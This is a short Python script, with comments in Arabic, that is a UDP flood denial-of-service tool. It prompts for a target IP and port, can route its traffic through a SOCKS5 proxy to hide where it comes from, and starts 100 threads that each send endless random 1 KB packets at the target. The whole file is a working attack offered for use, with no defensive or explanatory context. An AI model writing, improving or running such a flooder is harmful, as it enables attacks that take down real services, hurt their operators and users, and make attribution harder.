
import socket
import random
import threading
import os
import socks

def get_user_input():
    # طلب إدخال عنوان IP والمنفذ
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))

    # خيار إضافة بروكسي
    use_proxy = input("Do you want to use a proxy? (yes/no): ").strip().lower()
    proxy = None
    if use_proxy == 'yes':
        proxy = input("Enter the proxy in format socks5://ip:port: ").strip()

    return target_ip, target_port, proxy

# إرسال حزم إلى الهدف من مآخذ متعددة في خيوط متعددة
def attack(target_ip, target_port, proxy=None):
    if proxy:
        proxy_ip, proxy_port = proxy.replace("socks5://", "").split(":")
        proxy_port = int(proxy_port)

        # إعداد اتصال باستخدام بروكسي SOCKS5
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        socket.socket = socks.socksocket

    # إنشاء مأخذ
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            data = os.urandom(1024)  # زيادة حجم الحمولة
            s.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")

def main():
    target_ip, target_port, proxy = get_user_input()

    threads = []
    for i in range(100):
        t = threading.Thread(target=attack, args=(target_ip, target_port, proxy))
        threads.append(t)

    # بدء الخيوط
    for t in threads:
        t.start()

if __name__ == "__main__":
    main()
